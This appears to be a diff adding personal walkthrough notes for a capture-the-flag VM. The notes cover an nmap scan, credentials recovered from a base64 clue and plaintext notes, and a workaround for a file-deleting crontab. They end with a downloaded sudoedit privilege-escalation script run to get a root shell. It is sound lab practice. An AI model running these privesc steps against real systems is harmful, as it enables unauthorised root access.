@@ -1,0 +1,79 @@
+setup target VM on 10.133.1.4, using Internal Network on VirtualBox to prevent public access to vulnerable target
+
+nmap -sV  -p- 10.133.1.4
+
+21/tcp   open  ftp     vsftpd 2.0.8 or later
+visit in browser (could use ftp and anonymous : anonymous)
+note.txt (use jack?)
+
+1515/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+img/clue.txt
+c2NhcmVjcm93IDogNVFuQCR5 (~/pumpkin-hash.txt)
+scarecrow : 5Qn@$y (b64 decode)
+
+3535/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13
+
+note.txt
+Oops!!! I just forgot; keys to the garden are with LordPumpkin(ROOT user)! 
+Reach out to goblin and share this "Y0n$M4sy3D1t" to secretly get keys from LordPumpkin.
+
+ls /home/
+goblin jack scarecrow
+
+goblin : Y0n$M4sy3D1t
+
+
+cat note
+
+Hello Friend! I heard that you are looking for PumpkinGarden key. 
+But Key to the garden will be with LordPumpkin(ROOT user), don't worry, I know where LordPumpkin had placed the Key.
+You can reach there through my backyard.
+
+Here is the key to my backyard
+https://www.securityfocus.com/data/vulnerabilities/exploits/38362.sh
+
+Wow!! A real privilege escalation! 
+Writes a shell script to /tmp/sudoedit, adds execute privs, calls su.
+How does this allow root?
+
+Try to scp it into goblin's home directory, but it kept getting erased.
+scp -P 3535 Downloads/38362.sh goblin@10.133.1.4:/home/goblin/privesc.sh
+
+crontab -l (nothing)
+sudo crontab -l (drake meme)
+
+* * * * * rm /home/goblin/*.*
+* * * * * sleep 15; rm /home/goblin/*.*
+* * * * * sleep 30; rm /home/goblin/*.*
+* * * * * rm /tmp/*
+* * * * * sleep 15; rm /tmp/*
+* * * * * sleep 30; rm /tmp/*
+
+it's only deleting files (no -r)
+
+mkdir ggnore
+
+(kali) scp -P 3535 Downloads/38362.sh goblin@10.133.1.4:/home/goblin/ggnore/privesc.sh
+
+privesc script says to pass in file you can modify as first arg
+
+cd ggnore
+touch hax
+chmod +x privesc.sh
+privesc.sh hax
+...
+ALEX-ALEX
+root@Pumpkin:/tmp#
+
+Boom! Root!
+
+find / -name PumpkinGarden_key
+nada
+
+cd (home directory is assumed)
+ls
+PumpkinGarden_Key
+
+cat PumpkinGarden_Key
+base64 -d PumpkinGarden_Key
+"Congratulations!"
